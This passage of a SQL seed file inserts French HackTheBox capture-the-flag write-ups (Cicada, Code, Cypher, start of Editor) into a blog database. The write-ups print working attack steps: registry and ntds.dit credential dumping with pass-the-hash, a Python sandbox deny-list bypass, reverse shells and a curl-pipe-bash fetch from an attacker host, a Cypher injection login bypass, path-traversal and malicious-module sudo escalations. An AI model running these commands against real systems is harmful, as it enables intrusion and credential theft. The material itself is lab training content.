> Le privilège **SeBackupPrivilege** permet d''appeler des API de lecture de fichiers qui ignorent les vérifications de sécurité NTFS. L''objectif est d''extraire les ruches **SAM** et **SYSTEM** pour récupérer le hash NTLM de l''administrateur local, ou de copier la base **NTDS** pour compromettre l''intégralité du domaine.

#### Extraction des ruches du Registre

Puisque je suis sur un **Domain Controller**, je peux extraire les secrets locaux via le registre pour obtenir un accès **Administrator**.

```powershell
# Sauvegarde des ruches sur la cible
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save

# Téléchargement via Evil-WinRM
download sam.save
download system.save
download security.save
```

#### Extraction des Hashes NTLM

J''utilise la suite **Impacket** pour parser les fichiers récupérés et extraire les hashes :

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

Le dump me fournit le hash NTLM de l''utilisateur **Administrator** :
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341`

#### Compromission Totale (Root)

Je valide le hash avec **netexec** puis je me connecte via **Pass-the-Hash** :

```bash
netexec smb 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

---

### Beyond Root : Analyse Post-Exploitation

La compromission d''un **Domain Controller** ne s''arrête pas à l''obtention d''un shell `SYSTEM`. L''étape suivante consiste à exfiltrer la base de données de l''**Active Directory** (`ntds.dit`) pour obtenir les identifiants de tous les utilisateurs du domaine.

#### Extraction du ntds.dit via Diskshadow

Le fichier `ntds.dit` est verrouillé par le processus `lsass.exe`. Pour le copier, je dois créer un **Volume Shadow Copy** (VSS). J''utilise l''outil natif **diskshadow** avec un script de configuration.

**Script `backup.txt` :**
```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

J''exécute le script et je copie le fichier vers mon répertoire de travail :

```powershell
diskshadow /s backup.txt
robocopy /b E:\Windows\ntds . ntds.dit
```

#### Dump complet du Domaine

Une fois le `ntds.dit` et la ruche `SYSTEM` récupérés, je peux extraire tous les hashes du domaine :

```bash
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```

**Analyse de la vulnérabilité :**
La compromission de cette machine met en évidence une chaîne de mauvaises configurations classiques :
1.  **Information Disclosure** : Mot de passe par défaut laissé dans un fichier texte accessible en invité.
2.  **Insecure Storage** : Mot de passe stocké en clair dans l''attribut `Description` d''un objet utilisateur LDAP.
3.  **Over-privileged Account** : Un compte de service (utilisé pour des scripts de backup) possède des privilèges d''administration indirecte (**Backup Operators**) sans restriction de connexion, permettant une élévation directe vers **Domain Admin**.

Pour remédier à cela, il est impératif d''appliquer le principe du **Least Privilege**, d''utiliser des **Managed Service Accounts (gMSA)** pour les scripts, et de nettoyer régulièrement les attributs sensibles dans l''**Active Directory**.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Active Directory', 'SMB', 'Kerberos', 'Privilege Escalation'],
  'L''énumération initiale commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque de la cible. Les résultats indiquent un **Windows Domain Controller** (DC) classique au sein du domaine `cicada.htb`. Les services critiques identifié...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-cicada-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Code
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Code',
  'htb-code',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### 1. Reconnaissance (Scanning & Énumération)

Ma phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque. La machine expose deux services principaux.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 10.10.11.62

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 22,5000 -sCV 10.10.11.62
```

**Résultats :**
*   **Port 22 (SSH) :** OpenSSH 8.2p1 (Ubuntu 20.04).
*   **Port 5000 (HTTP) :** Serveur **Gunicorn** 20.0.4, indiquant une application **Python** (probablement **Flask**).

L''interface web est un **Python Code Editor** permettant d''exécuter du code directement dans le navigateur. Je note la présence de fonctionnalités d''authentification (`/login`, `/register`) et de sauvegarde de scripts (`/save_code`).

### 2. Analyse de l''Application Web

L''application utilise des **Flask Cookies** pour la gestion de session. En utilisant **flask-unsign**, je peux décoder le cookie pour inspecter les données stockées côté client.

```bash
# Décodage du cookie de session
flask-unsign -d -c ".eJx1jDEKAjEQRa8yTh22sdsbCBZiJ7IsQzIbB-IEMsmKLHt304pY_eK99zecl0T2YMPxviHUPvhkM4qMDk-6UpIAvnBgrULJBrgkJmOo5Q0USXTAaXe_7ZWjWC1UJStY876TpaUD3HIDTwqaX5ByhL8P5xzlK-3a5LAZl1kCjsf9A3p0QS8.Z-Mprw.Bl2n0KwU49LfnIGrB5TW-cw8lJA"
```

Le cookie contient un `user_id`, confirmant une architecture classique de base de données en backend. Un scan de répertoires avec **feroxbuster** ne révèle aucun point d''entrée caché, me ramenant à la fonctionnalité principale : l''exécution de code.

### 3. Identification de la Vulnérabilité (Deny List)

En tentant d''exécuter des commandes Python standards pour obtenir une **Remote Code Execution (RCE)**, je me heurte à un mécanisme de sécurité. L''application implémente une **Deny List** (liste noire) de mots-clés.

Mes tests révèlent que les termes suivants sont bloqués :
*   `import`
*   `os`
*   `subprocess`
*   `__builtins__`
*   `open`
*   `read`

Le filtre semble être une simple vérification de chaîne de caractères (string matching) avant l''exécution, car même des chaînes comme `ximportx` sont rejetées.

> **Schéma Mental :**
> L''application reçoit du code Python -> Elle vérifie la présence de mots interdits via un filtre statique -> Si absent, elle passe le code à une fonction type `exec()`. Pour contourner cela, je dois accéder aux fonctions dangereuses sans jamais taper leur nom explicitement dans mon payload.

### 4. Exploitation : Bypassing le Python Sandbox

Pour contourner ce filtre, j''utilise l''introspection Python. La fonction `globals()` retourne un dictionnaire de l''espace de nommage global, incluant souvent des modules déjà chargés comme `os`.

**Méthodologie du Bypass :**
1.  Accéder au module `os` via `globals()` en utilisant la concaténation de chaînes : `globals()[''o'' + ''s'']`.
2.  Récupérer la méthode `popen` via `getattr()` pour éviter le mot-clé bloqué.
3.  Exécuter une commande système et lire le résultat en reconstruisant la méthode `read()`.

**Payload de test (ID) :**
```python
print(getattr(globals()[''o''+''s''], ''po''+''pen'')(''id'').read())
```
*Note : Si `read` est bloqué, j''utilise à nouveau `getattr(..., ''re''+''ad'')()`.*

### 5. Obtention du Premier Shell

Une fois la **RCE** confirmée, je génère un **Reverse Shell** Bash classique. Je l''encode pour éviter tout problème de caractères spéciaux dans la requête POST vers `/run_code`.

```bash
# Payload final pour le reverse shell
getattr(globals()[''o''+''s''], ''po''+''pen'')(''bash -c "bash -i >& /dev/tcp/10.10.14.X/443 0>&1"'').read()
```

Je reçois une connexion sur mon listener **netcat** en tant qu''utilisateur `app-production`.

```bash
nc -lvnp 443
# Stabilisation du shell (TTY Upgrade)
script /dev/null -c bash
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Je peux désormais lire le premier flag dans `/home/app-production/user.txt`. Pour garantir la persistance, j''ajoute ma clé publique SSH dans `.ssh/authorized_keys`.

```bash
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAAC3... user@host" > ~/.ssh/authorized_keys
```

---

### Énumération Interne & Pivot vers l''utilisateur Martin

Une fois le **Reverse Shell** stabilisé sur l''utilisateur `app-production`, j''entame une phase d''énumération locale pour identifier des vecteurs de mouvement latéral.

#### Énumération de la base de données
Le répertoire de l''application contient une instance **SQLite**. C''est souvent là que sont stockées les informations d''authentification des utilisateurs du portail.

```bash
# Localisation de la DB
ls -la /home/app-production/app/instance/database.db

# Exploration des tables
sqlite3 /home/app-production/app/instance/database.db ".tables"
# Résultat : code  user

# Extraction des credentials
sqlite3 /home/app-production/app/instance/database.db "SELECT * FROM user;"
# 1|development|759b74ce43947f5f4c91aeddc3e5bad3
# 2|martin|3de6f30c4a09c27fc71932bfc68474be
```

> **Schéma Mental :** Accès Système -> Lecture de la base de données locale -> Extraction de **Hashes MD5** -> Préparation du mouvement latéral via **Credential Reuse**.

#### Cracking de Hash & Pivot
Les hashes identifiés sont au format **MD5** (32 caractères hexadécimaux). Comme ils ne sont pas "saltés", une simple recherche sur **CrackStation** ou un brute-force rapide suffit.

*   `759b74ce43947f5f4c91aeddc3e5bad3` : `development`
*   `3de6f30c4a09c27fc71932bfc68474be` : `nafeelswordsmaster`

Le mot de passe de `martin` permet une connexion via **SSH** ou un simple `su`.

```bash
ssh martin@10.10.11.62
# Password: nafeelswordsmaster
```

---

### Escalade de Privilèges : Root

#### Analyse des droits Sudo
L''énumération des privilèges de `martin` révèle une configuration **Sudoers** intéressante.

```bash
martin@code:~$ sudo -l
(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

L''utilisateur peut exécuter un script **Bash** nommé `backy.sh` avec les droits **root**. Ce script sert de **Wrapper** pour un utilitaire de sauvegarde nommé `backy`.

#### Analyse de la vulnérabilité dans backy.sh
Le script tente de sécuriser les sauvegardes en filtrant les entrées utilisateur via **jq** et en vérifiant que les chemins commencent par `/var/` ou `/home/`.

```bash
# Extrait critique du script :
updated_json=$(/usr/bin/jq ''.directories_to_archive |= map(gsub("\\.\\./"; ""))'' "$json_file")
```

La vulnérabilité réside dans l''utilisation de `gsub("\\.\\./"; "")`. Ce filtre n''est pas récursif. Si j''injecte la séquence `....//`, le filtre supprime la première occurrence de `../` trouvée à l''intérieur, laissant une séquence `../` valide derrière elle.

> **Schéma Mental :** Analyse du Wrapper -> Identification d''un filtre **Path Traversal** non-récursif -> Bypass via **Double Payload** -> Accès hors des répertoires autorisés (`/root`).

#### Exploitation du Path Traversal
Je crée un fichier `task.json` malveillant pour forcer la sauvegarde du répertoire `/root`.

```bash
# Création du payload dans /dev/shm
cat << EOF > /dev/shm/exploit.json
{
  "destination": "/dev/shm/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root/"
  ]
}
EOF

# Exécution du script avec les droits root
sudo /usr/bin/backy.sh /dev/shm/exploit.json
```

Le script transforme `/var/....//root/` en `/var/../root/`, ce qui est un chemin valide pointant vers la racine du système de fichiers.

#### Extraction des secrets
Le script génère une archive compressée dans `/dev/shm/`. Il ne reste plus qu''à l''extraire pour récupérer le flag ou la clé SSH de root.

```bash
cd /dev/shm/
tar xjf code_var_.._root_*.tar.bz2
cat root/root.txt
cat root/.ssh/id_rsa
```

---

### Analyse Post-Exploitation (Beyond Root)

#### La protection "Protected Regular"
Lors de l''exploitation, si le fichier `task.json` appartient à `martin` mais que **root** tente d''écrire dedans (via la redirection `> "$json_file"` dans le script), cela peut échouer dans certains répertoires comme `/tmp` ou `/dev/shm` à cause du paramètre kernel **fs.protected_regular**.

*   **Comportement :** Empêche un utilisateur privilégié d''écrire dans un fichier appartenant à un autre utilisateur dans un répertoire avec le **Sticky Bit**.
*   **Conséquence imprévue :** Si l''écriture échoue, le script continue parfois avec le fichier original non filtré, permettant un **Path Traversal** direct sans même utiliser le bypass `....//`.

#### Alternative via SQLAlchemy
Il était possible d''énumérer la base de données directement depuis l''éditeur de code Python (Foothold) en accédant aux objets **SQLAlchemy** chargés en mémoire via `globals()`.

```python
# Payload pour l''éditeur web
print(globals()[''User''].query.all())
# Permet de dumper les objets User et leurs attributs (username/password) sans shell.
```

---

# Élévation de Privilèges & Domination

## Étape 1 : Mouvement Latéral vers Martin

Après avoir obtenu un accès initial en tant que **app-production**, j''énumère le système de fichiers à la recherche de vecteurs de pivot. Je découvre une base de données **SQLite** située dans `/home/app-production/app/instance/database.db`.

```bash
# Extraction des hashes MD5
sqlite3 /home/app-production/app/instance/database.db "SELECT * FROM user;"
# Résultat : 2|martin|3de6f30c4a09c27fc71932bfc68474be
```

Le hash de **martin** est un **MD5** non salé. Une simple recherche sur **CrackStation** ou une attaque par dictionnaire avec **Hashcat** révèle le mot de passe en clair : `nafeelswordsmaster`. Ce mot de passe est valide pour **SSH**.

```bash
ssh martin@10.10.11.62
```

## Étape 2 : Analyse du vecteur Root (backy.sh)

L''énumération des droits **Sudo** montre que **martin** peut exécuter un script spécifique avec les privilèges de **root** sans mot de passe.

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Le script `/usr/bin/backy.sh` est un wrapper autour d''un utilitaire de sauvegarde nommé **backy** (écrit en Go). Le script effectue les actions suivantes :
1. Il prend un fichier `task.json` en argument.
2. Il utilise **jq** pour tenter de supprimer les séquences de **Path Traversal** (`../`).
3. Il vérifie que les répertoires à archiver commencent par `/var/` ou `/home/`.

> **Schéma Mental : Logique de la vulnérabilité backy.sh**
> 
> [Input: task.json] -> [Filtre JQ: gsub("\\.\\./"; "")] -> [Vérification: Prefix /var/ ou /home/] -> [Exécution: backy]
> 
> La faille réside dans le filtre **JQ** : il n''est pas récursif. Si j''injecte `....//`, le filtre retire `../` une seule fois, laissant une séquence `../` valide derrière lui.

## Étape 3 : Exploitation du Path Traversal

Pour compromettre **root**, je crée un fichier `task.json` malveillant qui utilise cette faiblesse de filtrage pour sortir de `/var/` et cibler `/root/`.

```json
{
  "destination": "/dev/shm/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root/"
  ]
}
```

J''exécute ensuite le script via **sudo**. Le filtre **JQ** transforme `/var/....//root/` en `/var/../root/`, ce qui est un chemin valide pointant vers le répertoire personnel de **root**, tout en satisfaisant la condition de préfixe `/var/`.

```bash
sudo /usr/bin/backy.sh /home/martin/task.json
```

L''archive générée dans `/dev/shm/` contient l''intégralité du répertoire `/root`. Je peux alors extraire la **SSH Private Key** (`id_rsa`) ou lire directement le flag.

```bash
cd /dev/shm
tar xjf code_var_.._root_*.tar.bz2
cat root/root.txt
```

# Beyond Root : Analyse Post-Exploitation

## Protection Kernel : Protected Regular

Lors de l''exploitation, si le fichier `task.json` est placé dans `/dev/shm` ou `/tmp`, le script peut échouer avec un message `Permission denied` lors de l''écriture par **root**. Cela est dû à la directive de sécurité du **Kernel Linux** nommée **fs.protected_regular**.

Cette mesure empêche **root** d''écrire dans un fichier régulier situé dans un répertoire avec le **Sticky Bit** (comme `/tmp`) s''il appartient à un autre utilisateur. C''est une défense contre les attaques de type **Symlink Race** et les écroulements de privilèges.

## Vecteur Non-Intentionnel : Bash Error Handling

Le script **Bash** ne possède pas de directive `set -e`. Par conséquent, si la commande **JQ** échoue (par exemple à cause de la protection **protected_regular** mentionnée ci-dessus), le script continue son exécution. 

Si je place mon `task.json` dans `/dev/shm` avec un **Path Traversal** classique (`/var/../root`), la réécriture par **JQ** échoue, mais la variable `directories_to_archive` conserve la valeur brute non filtrée. Le script passe alors ce chemin non assaini directement à l''exécutable **backy**, permettant une compromission totale sans même exploiter la faiblesse du `gsub`.

## Alternative Foothold : Introspection SQLAlchemy

Plutôt que de chercher un **RCE** complexe via le filtrage de mots-clés Python, il était possible d''abuser de l''**ORM SQLAlchemy** présent dans l''environnement de l''éditeur de code. 

En accédant à `globals()`, on peut identifier l''objet `User`. Puisque cet objet est lié à la base de données, l''utilisation de `User.query.all()` permet d''extraire les objets utilisateurs directement depuis la mémoire du processus web, révélant les hashes MD5 sans jamais avoir besoin d''un shell initial sur la machine.

```python
# Exemple d''extraction via l''éditeur web
print([u.password for u in globals()[''User''].query.all()])
```',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'Ma phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque. La machine expose deux services principaux. **Résultats :** * **Port 22 (SSH) :** OpenSSH 8.2p1 (Ubuntu 20.04). * **Port 5000 (HTTP) :** Serveur ...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-code-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Cypher
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Cypher',
  'htb-cypher',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Phase 1 : Reconnaissance & Brèche Initiale

#### Scanning & Énumération de Services

La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque réseau.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.57

# Scan de services détaillé sur les ports identifiés
nmap -p 22,80 -sCV 10.10.11.57
```

Le scan révèle deux ports ouverts :
*   **Port 22 (SSH)** : OpenSSH 9.6p1.
*   **Port 80 (HTTP)** : Nginx 1.24.0, redirigeant vers `http://cypher.htb/`.

J''ajoute l''entrée correspondante dans mon fichier `/etc/hosts` :
```text
10.10.11.57 cypher.htb
```

#### Énumération Web & Découverte de Vecteurs

Le site web présente "Graph ASM", un outil de gestion de surface d''attaque basé sur une base de données orientée graphe. Une énumération de répertoires via **feroxbuster** avec une recherche d''extensions spécifiques est lancée.

```bash
feroxbuster -u http://cypher.htb -x php,html,js -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Résultats notables :
*   `/login` : Interface d''authentification.
*   `/api/auth` : Point de terminaison pour l''authentification (méthode POST).
*   `/testing` : Répertoire avec **Directory Listing** activé, contenant un fichier nommé `custom-apoc-extension-1.0-SNAPSHOT.jar`.

#### Analyse Statique (Reverse Engineering) du JAR

Le fichier `.jar` est une extension pour **Neo4j** utilisant **APOC** (Awesome Procedures on Cypher). J''utilise **jadx-gui** pour décompiler le bytecode Java.

La classe `CustomFunctions` contient une procédure vulnérable : `getUrlStatusCode`.

```java
@Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
    // ... validation basique du protocole ...
    String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
    Process process = Runtime.getRuntime().exec(command);
    // ... lecture du résultat ...
}
```

> **Schéma Mental :**
> L''application Java prend une entrée utilisateur (`url`), la concatène directement dans une chaîne de commande système sans aucune sanitisation (hormis l''ajout de `https://` si absent), et l''exécute via `sh -c`. C''est une **Command Injection** directe si nous parvenons à invoquer cette procédure.

#### Brèche Initiale : Cypher Injection

Avant d''exploiter l''injection de commande, je dois accéder à l''interface de requête. La page de login est testée pour une **Cypher Injection** (l''équivalent SQLi pour les bases de données graphes).

En injectant un caractère spécial (`''`) dans le champ `username`, l''application retourne une erreur détaillée révélant la structure de la requête :
`MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = ''admin'''' return h.value as hash`

L''application compare le hash retourné par la base de données avec le hash SHA1 du mot de passe fourni par l''utilisateur. Pour bypasser l''authentification, j''utilise une clause `UNION` pour forcer la requête à retourner le hash d''un mot de passe que je contrôle.

**Payload d''injection (Username) :**
```cypher
'' return h.value as hash UNION return "9948e7baab1783a947c469c4c61e9f4bcce559b0" AS hash LIMIT 1;//
```
*(Note : `9948e7baab1783a947c469c4c61e9f4bcce559b0` est le hash SHA1 de `0xdf`)*.

En saisissant ce payload comme nom d''utilisateur et `0xdf` comme mot de passe, je parviens à me connecter.

#### Exploitation : Remote Code Execution (RCE)

Une fois authentifié, l''interface permet d''exécuter des requêtes **Cypher**. J''utilise la procédure personnalisée identifiée précédemment pour déclencher la **Command Injection**.

> **Schéma Mental :**
> 1. Invoquer la procédure : `CALL custom.getUrlStatusCode(...)`.
> 2. Injecter un délimiteur de commande : `;` ou `&&`.
> 3. Exécuter un **Reverse Shell**.

Je prépare un script shell sur ma machine d''attaque :
```bash
echo "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" > shell.sh
python3 -m http.server 80
```

Puis j''exécute la requête suivante dans l''interface web :
```cypher
CALL custom.getUrlStatusCode("cypher.htb; curl 10.10.14.6/shell.sh | bash; ") YIELD statusCode RETURN statusCode
```

**Résultat :**
La commande est exécutée par le système, télécharge mon script et l''exécute, m''octroyant un shell initial en tant qu''utilisateur `neo4j`.

```bash
nc -lnvp 443
# Connexion reçue de 10.10.11.57
neo4j@cypher:/$ id
uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)
```

---

### Énumération Interne & Post-Exploitation

Une fois le **Reverse Shell** obtenu en tant qu''utilisateur `neo4j`, ma priorité est l''énumération du système de fichiers pour identifier des vecteurs de mouvement latéral. Contrairement aux comptes de service standards, l''utilisateur `neo4j` possède un **Login Shell** configuré (`/bin/bash`) et un répertoire personnel actif dans `/var/lib/neo4j`.

L''examen des fichiers cachés révèle la présence d''un fichier `.bash_history`, ce qui est souvent une mine d''or pour récupérer des credentials saisis par erreur en ligne de commande.

```bash
# Vérification des utilisateurs et des shells
cat /etc/passwd | grep ''sh$''

# Exploration du home de neo4j
ls -la /var/lib/neo4j
cat /var/lib/neo4j/.bash_history
```

Le fichier contient la commande suivante :
`neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK`

### Mouvement Latéral : de neo4j à graphasm

L''énumération des utilisateurs via `/etc/passwd` a identifié un utilisateur humain : **graphasm**. Dans de nombreux environnements, la **Password Reuse** est une faiblesse critique. Je teste ce mot de passe pour l''utilisateur `graphasm`.

> **Schéma Mental : Pivot par Password Reuse**
> `neo4j` (Compte de service) -> Extraction de secret via `.bash_history` -> Test de collision de mot de passe -> `graphasm` (Utilisateur système)

Le mot de passe est valide pour `su` et pour une connexion **SSH**, ce qui permet d''obtenir un shell stable et persistant.

```bash
# Tentative de changement d''utilisateur
su - graphasm

# Connexion persistante via SSH
ssh graphasm@cypher.htb
```

### Escalade de Privilèges : de graphasm à root

L''énumération des privilèges **Sudo** via `sudo -l` montre que `graphasm` peut exécuter l''outil **bbot** (Bighuge BLS OSINT Tool) avec les droits **root** sans mot de passe.

```bash
graphasm@cypher:~$ sudo -l
(ALL) NOPASSWD: /usr/local/bin/bbot
```

**bbot** est un framework OSINT modulaire. La capacité d''exécuter cet outil en tant que **root** permet deux vecteurs d''attaque : un **Arbitrary File Read** partiel et une **Arbitrary Code Execution** via le chargement de modules personnalisés.

#### Vecteur 1 : Lecture de fichier (Looting)
En utilisant l''option `-w` (**Whitelist**) combinée au mode `-d` (**Debug**), l''outil tente de parser le fichier fourni. S''il s''agit d''un fichier texte simple comme `root.txt`, le contenu est parfois affiché dans les logs de debug lors de la génération des Regex de filtrage.

```bash
sudo bbot -w /root/root.txt -d
```

#### Vecteur 2 : Exécution de code via Module Custom (RCE)
C''est la méthode la plus propre pour obtenir un shell **root**. **bbot** permet de spécifier des répertoires de modules et des **Presets** via des fichiers YAML. Je crée un module Python malveillant et un fichier de configuration pour forcer son chargement.

> **Schéma Mental : Détournement de logique BBOT**
> Création d''un module Python (`os.system`) -> Création d''un Preset YAML pointant vers le module -> Exécution via `sudo bbot` -> Élévation de privilèges via l''import Python.

```bash
# 1. Création du module malveillant dans /dev/shm
echo ''import os; os.system("/bin/bash")'' > /dev/shm/ExploitModule.py

# 2. Création du preset YAML pour charger le module
cat << EOF > /dev/shm/exploit.yml
modules:
  - ExploitModule
module_dirs:
  - /dev/shm/
EOF

# 3. Exécution de bbot avec le preset malveillant
sudo bbot -p /dev/shm/exploit.yml
```

L''exécution déclenche l''import du module `ExploitModule.py` avant même que le scan ne commence réellement, m''octroyant un shell interactif en tant que **root**.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois le pied posé sur la machine en tant que **graphasm**, l''objectif est d''identifier une trajectoire vers les privilèges **root**. L''énumération des droits **Sudo** révèle un vecteur immédiat lié à un outil d''**OSINT** spécifique.

#### 1. Énumération des vecteurs Sudo

L''exécution de `sudo -l` montre que l''utilisateur peut exécuter **BBOT** (**Bighuge BLS OSINT Tool**) avec les privilèges les plus élevés sans mot de passe.

```bash
# Vérification des privilèges sudo
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

#### 2. Exploitation de BBOT (Vecteur de lecture de fichiers)

**BBOT** est un framework modulaire complexe. Une première méthode d''exploitation, bien que limitée, consiste à abuser de l''argument `--whitelist` (`-w`) combiné au mode `--debug` (`-d`). Lorsque **BBOT** tente de parser un fichier de whitelist qui n''est pas au format attendu, il peut refléter le contenu des lignes dans les logs de debug.

```bash
# Lecture arbitraire (partielle) via le mode debug
sudo bbot -w /root/root.txt -d
```

> **Schéma Mental :**
> **Sudo Privilege** sur un outil complexe -> Recherche d''arguments de lecture de fichiers (`-w`) -> Activation de la verbosité maximale (`-d`) -> Fuite de données (Leak) via le parsing des erreurs de la **Regex** interne de l''outil.

#### 3. Exploitation de BBOT (Vecteur RCE via Custom Module)

La méthode la plus robuste pour obtenir un **Root Shell** consiste à utiliser la capacité de **BBOT** à charger des modules personnalisés. En définissant un répertoire de modules contrôlé par l''utilisateur, on peut forcer l''exécution de code Python arbitraire lors de l''initialisation du scan.

**Étape A : Création du module malveillant**
On crée un fichier Python dans `/dev/shm` qui exécute une commande système dès son chargement.

```python
# /dev/shm/ExploitModule.py
import os
os.system("/bin/bash")
```

**Étape B : Configuration du profil BBOT**
On crée un fichier de configuration **YAML** pour indiquer à **BBOT** où chercher ce nouveau module.

```yaml
# /dev/shm/pwn.yml
modules:
  - ExploitModule
module_dirs:
  - /dev/shm/
```

**Étape C : Exécution**
Il suffit ensuite de lancer **BBOT** en pointant vers ce profil avec `sudo`.

```bash
# Déclenchement de l''exécution de code en tant que root
sudo bbot -p /dev/shm/pwn.yml
```

L''outil charge le module, exécute le `os.system("/bin/bash")` et nous rend un shell avec l''**UID 0**.

---

### Beyond Root : Analyse Post-Exploitation

L''analyse de l''infrastructure révèle une architecture segmentée et des erreurs de configuration critiques.

#### 1. Chemin non intentionnel (Unintended Path)
Une énumération agressive de l''**API** aurait permis de découvrir l''endpoint `/api/cypher`. Contrairement au reste de l''application, cet endpoint ne vérifie pas l''authentification, permettant une **Command Injection** directe sans passer par le **Bypass Login** initial.

```bash
# RCE directe via l''API non protégée
curl ''http://cypher.htb/api/cypher?query=CALL+custom.getUrlStatusCode("localhost;+id")+YIELD+statusCode''
```

#### 2. Architecture Web & Conteneurisation
Le serveur **Nginx** principal agit comme un **Reverse Proxy**. 
- Les fichiers statiques sont servis depuis `/var/www/graphasm`.
- Les requêtes vers `/api` et `/demo` sont redirigées vers un service tournant sur le port **8000**.
- Ce service est un conteneur **Docker** nommé `fastapi`, exécutant une application **Uvicorn/FastAPI**.

#### 3. Persistance & Neo4J
Le mot de passe trouvé dans le `.bash_history` de l''utilisateur `neo4j` (`cU4btyib.20xtCMCXkBmerhK`) était réutilisé pour le compte système `graphasm`. C''est une faiblesse classique de **Password Reuse** entre les comptes de service et les comptes utilisateurs. L''extension **APOC** personnalisée (`custom-apoc-extension-1.0-SNAPSHOT.jar`) était la source de la vulnérabilité initiale, illustrant les dangers d''implémenter des fonctions de rappel système (`Runtime.getRuntime().exec()`) sans sanitisation rigoureuse des entrées utilisateur dans des environnements de base de données.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque réseau. Le scan révèle deux ports ouverts : * **Port 22 (SSH)** : OpenSSH 9.6p1. * **Port 80 (HTTP)** : Nginx 1.24.0, redirigeant vers `http://cyp...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-cypher-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Editor
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Editor',
  'htb-editor',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### 1. Reconnaissance Initiale & Scanning

Ma méthodologie débute par une phase de **Port Scanning** agressive pour identifier la surface d''exposition. J''utilise **nmap** en deux passes : une détection rapide de tous les ports TCP, suivie d''une énumération précise des services.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -vvv 10.10.11.80 -oN all_ports.nmap

# Scan de services détaillé
nmap -p 22,80,8080 -sCV 10.10.11.80 -oN service_scan.nmap
```

Le scan révèle trois points d''entrée :
*   **Port 22 (SSH)** : OpenSSH 8.9p1 (Ubuntu).
*   **Port 80 (HTTP)** : Nginx 1.18.0, redirigeant vers `http://editor.htb/`.
